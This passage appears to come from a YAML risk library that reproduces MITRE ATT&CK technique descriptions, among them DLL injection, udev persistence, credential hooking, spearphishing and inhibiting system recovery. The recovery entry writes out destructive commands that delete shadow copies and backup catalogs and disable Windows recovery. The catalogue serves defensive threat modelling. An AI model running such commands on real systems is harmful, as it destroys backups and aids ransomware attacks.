      \ systemsetup mac time) These time settings may also be synchronized between\
      \ systems and services in an enterprise network, typically accomplished with\
      \ a network time server within a domain.(Citation: Mac Time Sync)(Citation:\
      \ linux system time)\n\nSystem time information may be gathered in a number\
      \ of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows\
      \ by performing <code>net time \\\\hostname</code> to gather the system time\
      \ on a remote system. The victim's time zone may also be inferred from the current\
      \ system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet\
      \ Windows Time Service) In addition, adversaries can discover device uptime\
      \ through functions such as <code>GetTickCount()</code> to determine how long\
      \ it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)\n\
      \nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `show clock detail` can be used to see the current time configuration.(Citation:\
      \ show_clock_detail_cisco_cmd)\n\nIn addition, system calls \u2013 such as <code>time()</code>\
      \ \u2013 have been used to collect the current time on Linux devices.(Citation:\
      \ MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup\
      \ -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current\
      \ time zone information or current date and time.(Citation: System Information\
      \ Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\nThis information\
      \ could be useful for performing other techniques, such as executing a file\
      \ with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation:\
      \ RSA EU12 They're Inside), or to discover locality information based on time\
      \ zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)).\
      \ Adversaries may also use knowledge of system time as part of a time bomb,\
      \ or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)\n\
      https://attack.mitre.org/techniques/T1124"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.002
    ref_id: T1053.002
    name: At
    description: 'Adversaries may abuse the [at](https://attack.mitre.org/software/S0110)
      utility to perform task scheduling for initial or recurring execution of malicious
      code. The [at](https://attack.mitre.org/software/S0110) utility exists as an
      executable within Windows, Linux, and macOS for scheduling tasks at a specified
      time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)''s
      [schtasks](https://attack.mitre.org/software/S0111) in Windows environments,
      using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler
      service be running, and the user to be logged on as a member of the local Administrators
      group. In addition to explicitly running the `at` command, adversaries may also
      schedule a task with [at](https://attack.mitre.org/software/S0110) by directly
      leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)


      On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked
      by the superuser as well as any users added to the <code>at.allow</code> file.
      If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file
      is checked. Every username not listed in <code>at.deny</code> is allowed to
      invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code>
      exists and is empty, global use of [at](https://attack.mitre.org/software/S0110)
      is permitted. If neither file exists (which is often the baseline) only the
      superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation:
      Linux at)


      Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute
      programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003).
      [at](https://attack.mitre.org/software/S0110) can also be abused to conduct
      remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral
      Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under
      the context of a specified account (such as SYSTEM).


      In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110)
      to break out of restricted environments by using a task to spawn an interactive
      system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110)
      may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)
      if the binary is allowed to run as superuser via <code>sudo</code>.(Citation:
      GTFObins at)

      https://attack.mitre.org/techniques/T1053/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.001
    ref_id: T1055.001
    name: Dynamic-link Library Injection
    description: "Adversaries may inject dynamic-link libraries (DLLs) into processes\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ DLL injection is a method of executing arbitrary code in the address space\
      \ of a separate live process.  \n\nDLL injection is commonly performed by writing\
      \ the path to a DLL in the virtual address space of the target process before\
      \ loading the DLL by invoking a new thread. The write can be performed with\
      \ native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,\
      \ then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code>\
      \ API responsible for loading the DLL). (Citation: Elastic Process Injection\
      \ July 2017) \n\nVariations of this method such as reflective DLL injection\
      \ (writing a self-mapping DLL into a process) and memory module (map DLL when\
      \ writing into process) overcome the address relocation issue as well as the\
      \ additional APIs to invoke execution (since these methods load and execute\
      \ the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation:\
      \ Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July\
      \ 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading\
      \ or DLL Hollowing, may be leveraged to conceal injected code within a process.\
      \ This method involves loading a legitimate DLL into a remote process then manually\
      \ overwriting the module's <code>AddressOfEntryPoint</code> before starting\
      \ a new thread in the target process.(Citation: Module Stomping for Shellcode\
      \ Injection) This variation allows attackers to hide malicious injected code\
      \ by potentially backing its execution with a legitimate DLL file on disk.(Citation:\
      \ Hiding Malicious Code with Module Stomping) \n\nRunning code in the context\
      \ of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via DLL injection may\
      \ also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.005
    ref_id: T1588.005
    name: Exploits
    description: 'Adversaries may buy, steal, or download exploits that can be used
      during targeting. An exploit takes advantage of a bug or vulnerability in order
      to cause unintended or unanticipated behavior to occur on computer hardware
      or software. Rather than developing their own exploits, an adversary may find/modify
      exploits from online or purchase them from exploit vendors.(Citation: Exploit
      Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)


      In addition to downloading free exploits from the internet, adversaries may
      purchase exploits from third-party entities. Third-party entities can include
      technology companies that specialize in exploit development, criminal marketplaces
      (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation:
      Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may
      steal and repurpose exploits from third-party entities (including other adversaries).(Citation:
      TempertonDarkHotel)


      An adversary may monitor exploit provider forums to understand the state of
      existing, as well as newly discovered, exploits. There is usually a delay between
      when an exploit is discovered and when it is made public. An adversary may target
      the systems of those known to conduct exploit research and development in order
      to gain that knowledge for use during a subsequent operation.


      Adversaries may use exploits during various phases of the adversary lifecycle
      (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
      [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203),
      [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068),
      [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211),
      [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212),
      [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210),
      and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

      https://attack.mitre.org/techniques/T1588/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556
    ref_id: T1556
    name: Modify Authentication Process
    description: 'Adversaries may modify authentication mechanisms and processes to
      access user credentials or enable otherwise unwarranted access to accounts.
      The authentication process is handled by mechanisms, such as the Local Security
      Authentication Server (LSASS) process and the Security Accounts Manager (SAM)
      on Windows, pluggable authentication modules (PAM) on Unix-based systems, and
      authorization plugins on MacOS systems, responsible for gathering, storing,
      and validating credentials. By modifying an authentication process, an adversary
      may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).


      Adversaries may maliciously modify a part of this process to either reveal credentials
      or bypass authentication mechanisms. Compromised credentials or access may be
      used to bypass access controls placed on various resources on systems within
      the network and may even be used for persistent access to remote systems and
      externally available services, such as VPNs, Outlook Web Access and remote desktop.

      https://attack.mitre.org/techniques/T1556'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.017
    ref_id: T1546.017
    name: Udev Rules
    description: "Adversaries may maintain persistence through executing malicious\
      \ content triggered using udev rules. Udev is the Linux kernel device manager\
      \ that dynamically manages device nodes, handles access to pseudo-device files\
      \ in the `/dev` directory, and responds to hardware events, such as when external\
      \ devices like hard drives or keyboards are plugged in or removed. Udev uses\
      \ rule files with `match keys` to specify the conditions a hardware event must\
      \ meet and `action keys` to define the actions that should follow. Root permissions\
      \ are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`,\
      \ `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`,\
      \ and `/lib/udev/rules.d/`. Rule priority is determined by both directory and\
      \ by the digit prefix in the rule filename.(Citation: Ignacio Udev research\
      \ 2024)(Citation: Elastic Linux Persistence 2024)\n\nAdversaries may abuse the\
      \ udev subsystem by adding or modifying rules in udev rule files to execute\
      \ malicious content. For example, an adversary may configure a rule to execute\
      \ their binary each time the pseudo-device file, such as `/dev/random`, is accessed\
      \ by an application. Although udev is limited to running short tasks and is\
      \ restricted by systemd-udevd's sandbox (blocking network and filesystem access),\
      \ attackers may use scripting commands under the action key `RUN+=` to detach\
      \ and run the malicious content\u2019s process in the background to bypass these\
      \ controls.(Citation: Reichert aon sedexp 2024)\nhttps://attack.mitre.org/techniques/T1546/017"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.004
    ref_id: T1056.004
    name: Credential API Hooking
    description: "Adversaries may hook into Windows application programming interface\
      \ (API) functions to collect user credentials. Malicious hooking mechanisms\
      \ may capture API calls that include parameters that reveal user authentication\
      \ credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike\
      \ [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique\
      \ focuses specifically on API functions that include parameters that reveal\
      \ user credentials. Hooking involves redirecting calls to these functions and\
      \ can be implemented via:\n\n* **Hooks procedures**, which intercept and execute\
      \ designated code in response to events such as messages, keystrokes, and mouse\
      \ inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection\
      \ July 2017)\n* **Import address table (IAT) hooking**, which use modifications\
      \ to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation:\
      \ Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct\
      \ 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,\
      \ which overwrites the first bytes in an API function to redirect code flow.(Citation:\
      \ Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking\
      \ Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\nhttps://attack.mitre.org/techniques/T1056/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1495
    ref_id: T1495
    name: Firmware Corruption
    description: 'Adversaries may overwrite or corrupt the flash memory contents of
      system BIOS or other firmware in devices attached to a system in order to render
      them inoperable or unable to boot, thus denying the availability to use the
      devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is
      software that is loaded and executed from non-volatile memory on hardware devices
      in order to initialize and manage device functionality. These devices may include
      the motherboard, hard drive, or video cards.


      In general, adversaries may manipulate, overwrite, or corrupt firmware in order
      to deny the use of the system or devices. For example, corruption of firmware
      responsible for loading the operating system for network devices may render
      the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation:
      cisa_malware_orgs_ukraine) Depending on the device, this attack may also result
      in [Data Destruction](https://attack.mitre.org/techniques/T1485).

      https://attack.mitre.org/techniques/T1495'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1490
    ref_id: T1490
    name: Inhibit System Recovery
    description: "Adversaries may delete or remove built-in data and turn off services\
      \ designed to aid in the recovery of a corrupted system to prevent recovery.(Citation:\
      \ Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny\
      \ access to available backups and recovery options.\n\nOperating systems may\
      \ contain features that can help fix corrupted systems, such as a backup catalog,\
      \ volume shadow copies, and automatic repair features. Adversaries may disable\
      \ or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485)\
      \ and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation:\
      \ Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore,\
      \ adversaries may disable recovery notifications, then corrupt backups.(Citation:\
      \ disable_notif_synology_ransom)\n\nA number of native Windows utilities have\
      \ been used by adversaries to disable or delete system recovery features:\n\n\
      * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on\
      \ a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows\
      \ Management Instrumentation](https://attack.mitre.org/techniques/T1047) can\
      \ be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n\
      * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog\
      \ - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code>\
      \ can be used to disable automatic Windows recovery features by modifying boot\
      \ configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\
      \ & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code>\
      \ can be used to disable Windows Recovery Environment (WinRE) repair/recovery\
      \ options of an infected system\n* <code>diskshadow.exe</code> can be used to\
      \ delete all volume shadow copies on a system - <code>diskshadow delete shadows\
      \ all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network\
      \ devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561)\
      \ to delete backup firmware images and reformat the file system, then [System\
      \ Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the\
      \ device. Together this activity may leave network devices completely inoperable\
      \ and inhibit recovery operations.\n\nAdversaries may also delete \u201Conline\u201D\
      \ backups that are connected to their network \u2013 whether via network storage\
      \ media or through folders that sync to cloud services.(Citation: ZDNet Ransomware\
      \ Backups 2020) In cloud environments, adversaries may disable versioning and\
      \ backup policies and delete snapshots, database backups, machine images, and\
      \ prior versions of objects designed to be used in disaster recovery scenarios.(Citation:\
      \ Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3\
      \ Ransomware)\nhttps://attack.mitre.org/techniques/T1490"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.007
    ref_id: T1546.007
    name: Netsh Helper DLL
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is
      a command-line scripting utility used to interact with the network configuration
      of a system. It contains functionality to add helper DLLs for extending functionality
      of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper
      DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.


      Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary
      code in a persistent manner. This execution would take place anytime netsh.exe
      is executed, which could happen automatically, with another persistence technique,
      or if other software (ex: VPN) is present on the system that executes netsh.exe
      as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation:
      Demaske Netsh Persistence)

      https://attack.mitre.org/techniques/T1546/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.003
    ref_id: T1566.003
    name: Spearphishing via Service
    description: "Adversaries may send spearphishing messages via third-party services\
      \ in an attempt to gain access to victim systems. Spearphishing via service\
      \ is a specific variant of spearphishing. It is different from other forms of\
      \ spearphishing in that it employs the use of third party services rather than\
      \ directly via enterprise email channels. \n\nAll forms of spearphishing are\
      \ electronically delivered social engineering targeted at a specific individual,\
      \ company, or industry. In this scenario, adversaries send messages through\
      \ various social media services, personal webmail, and other non-enterprise\
      \ controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services\
      \ are more likely to have a less-strict security policy than an enterprise.\
      \ As with most kinds of spearphishing, the goal is to generate rapport with\
      \ the target or get the target's interest in some way. Adversaries will create\
      \ fake social media accounts and message employees for potential job opportunities.\
      \ Doing so allows a plausible reason for asking about services, policies, and\
      \ software that's running in an environment. The adversary can then send malicious\
      \ links or attachments through these services.\n\nA common example is to build\
      \ rapport with a target via social media, then send content to a personal webmail\
      \ service that the target uses on their work computer. This allows an adversary\
      \ to bypass some email restrictions on the work account, and the target is more\
      \ likely to open the file since it's something they were expecting. If the payload\
      \ doesn't work as expected, the adversary can continue normal communications\
      \ and troubleshoot with the target on how to get it working.\nhttps://attack.mitre.org/techniques/T1566/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.001
    ref_id: T1090.001
    name: Internal Proxy
    description: 'Adversaries may use an internal proxy to direct command and control
      traffic between two or more systems in a compromised environment. Many tools
      exist that enable traffic redirection through proxies or port redirection, including
      [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation:
      Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command
      and control communications inside a compromised environment, to reduce the number
      of simultaneous outbound network connections, to provide resiliency in the face
      of connection loss, or to ride over existing trusted communications paths between
      infected systems to avoid suspicion. Internal proxy connections may use common
      peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with
      the environment.


      By using a compromised internal system as a proxy, adversaries may conceal the
      true destination of C2 traffic while reducing the need for numerous connections
      to external systems.

      https://attack.mitre.org/techniques/T1090/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216
    ref_id: T1216
    name: System Script Proxy Execution
    description: 'Adversaries may use trusted scripts, often signed with certificates,
      to proxy the execution of malicious files. Several Microsoft signed scripts
      that have been downloaded from Microsoft or are default on Windows installations
      can be used to proxy execution of other files.(Citation: LOLBAS Project) This
      behavior may be abused by adversaries to execute malicious files that could
      bypass application control and signature validation on systems.(Citation: GitHub
      Ultimate AppLocker Bypass List)

      https://attack.mitre.org/techniques/T1216'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.001
    ref_id: T1102.001
    name: Dead Drop Resolver
    description: 'Adversaries may use an existing, legitimate external Web service
      to host information that points to additional command and control (C2) infrastructure.
      Adversaries may post content, known as a dead drop resolver, on Web services
      with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected,
      victims will reach out to and be redirected by these resolvers.


      Popular websites and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google or Twitter, makes it easier for adversaries to hide
      in expected noise. Web service providers commonly use SSL/TLS encryption, giving
      adversaries an added level of protection.


      Use of a dead drop resolver may also protect back-end C2 infrastructure from
      discovery through malware binary analysis while also enabling operational resiliency
      (since this infrastructure may be dynamically changed).

      https://attack.mitre.org/techniques/T1102/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.001
    ref_id: T1001.001
    name: Junk Data
    description: 'Adversaries may add junk data to protocols used for command and
      control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor
      December 2020) By adding random or meaningless data to the protocols used for
      command and control, adversaries can prevent trivial methods for decoding, deciphering,
      or otherwise analyzing the traffic. Examples may include appending/prepending
      data with junk characters or writing junk characters between significant characters.

      https://attack.mitre.org/techniques/T1001/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598.001
    ref_id: T1598.001
    name: Spearphishing Service
    description: 'Adversaries may send spearphishing messages via third-party services
      to elicit sensitive information that can be used during targeting. Spearphishing
      for information is an attempt to trick targets into divulging information, frequently
      credentials or other actionable information. Spearphishing for information frequently
      involves social engineering techniques, such as posing as a source with a reason
      to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or
      sending multiple, seemingly urgent messages.


      All forms of spearphishing are electronically delivered social engineering targeted
      at a specific individual, company, or industry. In this scenario, adversaries
      send messages through various social media services, personal webmail, and other
      non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing)
      These services are more likely to have a less-strict security policy than an
      enterprise. As with most kinds of spearphishing, the goal is to generate rapport
      with the target or get the target''s interest in some way. Adversaries may create
      fake social media accounts and message employees for potential job opportunities.
      Doing so allows a plausible reason for asking about services, policies, and
      information about their environment. Adversaries may also use information from
      previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))
      to craft persuasive and believable lures.

      https://attack.mitre.org/techniques/T1598/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.007
    ref_id: T1552.007
    name: Container API
    description: 'Adversaries may gather credentials via APIs within a containers
      environment. APIs in these environments, such as the Docker API and Kubernetes
      APIs, allow a user to remotely manage their container resources and cluster
      components.(Citation: Docker API)(Citation: Kubernetes API)


      An adversary may access the Docker API to collect logs that contain credentials
      to cloud, container, and various other resources in the environment.(Citation:
      Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions,
      such as via a pod''s service account, may also use the Kubernetes API to retrieve
      credentials from the Kubernetes API server. These credentials may include those
      needed for Docker API authentication or secrets from Kubernetes cluster components.

      https://attack.mitre.org/techniques/T1552/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.001
    ref_id: T1584.001
    name: Domains
    description: 'Adversaries may hijack domains and/or subdomains that can be used
      during targeting. Domain registration hijacking is the act of changing the registration
      of a domain name without the permission of the original registrant.(Citation:
      ICANNDomainNameHijacking) Adversaries may gain access to an email account for
      the person listed as the owner of the domain. The adversary can then claim that
      they forgot their password in order to make changes to the domain registration.
      Other possibilities include social engineering a domain registration help desk
      to gain access to an account, taking advantage of renewal process gaps, or compromising
      a cloud service that enables managing domains (e.g., AWS Route53).(Citation:
      Krebs DNS Hijack 2019)


      Subdomain hijacking can occur when organizations have DNS entries that point
      to non-existent or deprovisioned resources. In such cases, an adversary may
      take control of a subdomain to conduct operations with the benefit of the trust
      associated with that domain.(Citation: Microsoft Sub Takeover 2020)


      Adversaries who compromise a domain may also engage in domain shadowing by creating
      malicious subdomains under their control while keeping any existing DNS records.
      As service will not be disrupted, the malicious subdomains may go unnoticed
      for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)

      https://attack.mitre.org/techniques/T1584/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.001
    ref_id: T1505.001
    name: SQL Stored Procedures
    description: "Adversaries may abuse SQL stored procedures to establish persistent\
      \ access to systems. SQL Stored Procedures are code that can be saved and reused\
      \ so that database users do not waste time rewriting frequently used SQL queries.\
      \ Stored procedures can be invoked via SQL statements to the database using\
      \ the procedure name or via defined events (e.g. when a SQL server application\
      \ is started/restarted).\n\nAdversaries may craft malicious stored procedures\
      \ that can provide a persistence mechanism in SQL database servers.(Citation:\
      \ NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute\
      \ operating system commands through SQL syntax the adversary may have to enable\
      \ additional functionality, such as xp_cmdshell for MSSQL Server.(Citation:\
      \ NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation:\
      \ Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language\
      \ runtime (CLR) integration. With CLR integration enabled, application developers\
      \ can write stored procedures using any .NET framework language (e.g. VB .NET,\
      \ C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft\
      \ or modify CLR assemblies that are linked to stored procedures since these\
      \ CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI\
      \ SQL Server CLR)\nhttps://attack.mitre.org/techniques/T1505/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.004
    ref_id: T1556.004
    name: Network Device Authentication
    description: 'Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
      to hard code a password in the operating system, thus bypassing of native authentication
      mechanisms for local accounts on network devices.


      [Modify System Image](https://attack.mitre.org/techniques/T1601) may include
      implanted code to the operating system for network devices to provide access
      for adversaries using a specific password.  The modification includes a specific
      password which is implanted in the operating system image via the patch.  Upon
      authentication attempts, the inserted code will first check to see if the user
      input is the password. If so, access is granted. Otherwise, the implanted code
      will pass the credentials on for verification of potentially valid credentials.(Citation:
      Mandiant - Synful Knock)

      https://attack.mitre.org/techniques/T1556/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.001
    ref_id: T1561.001
    name: Disk Content Wipe
    description: 'Adversaries may erase the contents of storage devices on specific
      systems or in large numbers in a network to interrupt availability to system
      and network resources.


      Adversaries may partially or completely overwrite the contents of a storage
      device rendering the data irrecoverable through the storage interface.(Citation:
      Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation:
      DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files,
      adversaries with destructive intent may wipe arbitrary portions of disk content.
      To wipe disk content, adversaries may acquire direct access to the hard drive
      in order to overwrite arbitrarily sized portions of disk with random data.(Citation:
      Novetta Blockbuster Destructive Malware) Adversaries have also been observed
      leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364)
      to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta
      Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485)
      because sections of the disk are erased instead of individual files.


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware used for wiping disk content
      may have worm-like features to propagate across a network by leveraging additional
      techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta
      Blockbuster Destructive Malware)

      https://attack.mitre.org/techniques/T1561/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.005
    ref_id: T1213.005
    name: Messaging Applications
    description: "Adversaries may leverage chat and messaging applications, such as\
      \ Microsoft Teams, Google Chat, and Slack, to mine valuable information.  \n\
      \nThe following is a brief list of example information that may hold potential\
      \ value to an adversary and may also be found on messaging applications: \n\n\
      * Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008))\
      \ \n* Source code snippets \n* Links to network shares and other internal resources\
      \ \n* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)\n* Discussions\
      \ about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker\
      \ 2021)(Citation: Microsoft DEV-0537)\n\nIn addition to exfiltrating data from\
      \ messaging applications, adversaries may leverage data from chat messages in\
      \ order to improve their targeting - for example, by learning more about an\
      \ environment or evading ongoing incident response efforts.(Citation: Sentinel\
      \ Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)\nhttps://attack.mitre.org/techniques/T1213/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.003
    ref_id: T1048.003
    name: Exfiltration Over Unencrypted Non-C2 Protocol
    description: 'Adversaries may steal data by exfiltrating it over an un-encrypted
      network protocol other than that of the existing command and control channel.
      The data may also be sent to an alternate network location from the main command
      and control server.(Citation: copy_cmd_cisco)


      Adversaries may opt to obfuscate this data, without the use of encryption, within
      network protocols that are natively unencrypted (such as HTTP, FTP, or DNS).
      This may include custom or publicly available encoding/compression algorithms
      (such as base64) as well as embedding data within protocol headers and fields.

      https://attack.mitre.org/techniques/T1048/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.004
    ref_id: T1574.004
    name: Dylib Hijacking
    description: 'Adversaries may execute their own payloads by placing a malicious
      dynamic library (dylib) with an expected name in a path a victim application
      searches at runtime. The dynamic loader will try to find the dylibs based on
      the sequential order of the search paths. Paths to dylibs may be prefixed with
      <code>@rpath</code>, which allows developers to use relative paths to specify
      an array of search paths used at runtime based on the location of the executable.  Additionally,
      if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function,
      an application will still execute even if an expected dylib is not present.
      Weak linking enables developers to run an application on multiple macOS versions
      as new APIs are added.


      Adversaries may gain execution by inserting malicious dylibs with the name of
      the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable
      Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject
      HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are
      loaded into an application''s address space allowing the malicious dylib to
      inherit the application''s privilege level and resources. Based on the application,
      this could result in privilege escalation and uninhibited network access. This
      method may also evade detection from security products since the execution is
      masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation:
      wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection
      MachO)

      https://attack.mitre.org/techniques/T1574/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1601.002
    ref_id: T1601.002
    name: Downgrade System Image
    description: 'Adversaries may install an older version of the operating system
      of a network device to weaken security.  Older operating system versions on
      network devices often have weaker encryption ciphers and, in general, fewer/less
      updated defensive features. (Citation: Cisco Synful Knock Evolution)


      On embedded devices, downgrading the version typically only requires replacing
      the operating system file in storage.  With most embedded devices, this can
      be achieved by downloading a copy of the desired version of the operating system
      file and reconfiguring the device to boot from that file on next system restart.  The
      adversary could then restart the device to implement the change immediately
      or they could wait until the next time the system restarts.


      Downgrading the system image to an older versions may allow an adversary to
      evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading
      of a system image can be done on its own, or it can be used in conjunction with
      [Patch System Image](https://attack.mitre.org/techniques/T1601/001).

      https://attack.mitre.org/techniques/T1601/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.003
    ref_id: T1078.003
    name: Local Accounts
    description: 'Adversaries may obtain and abuse credentials of a local account
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion. Local accounts are those configured by an organization for
      use by users, remote support, services, or for administration on a single system
      or service.


      Local Accounts may also be abused to elevate privileges and harvest credentials
      through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
